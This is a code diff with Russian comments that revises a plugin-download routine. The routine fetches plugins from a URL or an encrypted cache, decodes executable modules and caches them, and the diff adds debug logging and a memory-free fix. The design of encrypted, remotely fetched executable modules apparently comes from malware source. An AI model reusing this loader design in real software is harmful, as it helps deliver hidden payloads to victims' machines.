@@ -613,7 +613,7 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 	DWORD BufSize = 0;
 	LPBYTE Buffer = NULL;
 
-	// Проверяем наличие файла в кэше
+	// Проверяем наличие файла в кэше и флаг использования кеша
 	if (CacheFileName != NULL)
 	{
 		PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
@@ -623,7 +623,9 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 		PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
 	}
 
-	// Если не удалось прочитать файл из кэша ио загружаем файл плагина
+	// загружаем файл плагина из сети, если:
+	// 1) выставлен флаг использования кеша и не удалось прочитать файл
+	// 2) не выставлен флаг использования кеша
 	bool Downloaded = false;
 	if (Buffer == NULL)
 	{
@@ -640,23 +642,33 @@ LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 
 
 	// 2. Расшифровываем плагин
+	// Важный момент: файл НЕ БУДЕТ раскодироватся только в случае, если 
+	// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
+	// сигнатуру
 
 	LPBYTE Module = NULL;
 
 	if (!IsExecutable || !IsExecutableFile(Buffer))
+	{
 		Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
+		PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
+	}
 	else
+	{
+		PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
 		Module = Buffer;
+	}
 
-
-	// При необходимости кэшируем файл
+	// При необходимости кэшируем файл:
+	// когда выставлен флаг использования кеша и файл был скачан из сети
 	if (CacheFileName != NULL && Downloaded && Module != NULL)
 	{
+		PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
 		CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
 	}
 
 	// Освобождаем данные
-    MemFree(Buffer);
+	if (Module != Buffer) MemFree(Buffer);
 	STR::Free(CacheFileName);
 
 
